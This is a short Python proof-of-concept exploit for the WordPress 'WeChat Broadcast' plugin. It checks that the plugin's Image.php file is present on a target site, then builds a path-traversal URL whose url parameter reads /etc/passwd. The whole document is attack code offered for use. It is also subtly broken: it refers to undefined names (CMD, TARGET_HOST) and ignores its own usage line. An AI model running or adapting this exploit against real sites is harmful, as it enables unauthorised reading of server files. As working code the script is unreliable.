import sys
from urllib import request

def exploit(host):
    """ WeChat Broadcast Plugin Exploit PoC
    
    Input: Target Host URL
    Output: URL
    """
    
    base_url = host
    print("[+] Exploit WeChat Broadcast Plugin @ {}".format(base_url))
    print("[~] Let's check if our target vulnerable plugin is installed.")

    target_url = "{}/wp-content/plugins/wechat-broadcast/wechat/Image.php".format(base_url)
    response = request.urlopen(target_url)
    if response.getcode() == 200:
        print("[+] Target Exists. Let the exploit begin.")
    else:
        return False
    
    cmd = "../../../../../../../../../../etc/passwd"
    attack_url = "{}?url={}".format(target_url, CMD)
    return attack_url


if __name__ == "__main__":
    try:
        exploit(TARGET_HOST)
    except:
        print("[-] Unexpected error while exploiting...")
        print("    Error: {}".format(sys.exc_info()[0]))
        print("Usage: exploit.py [host]")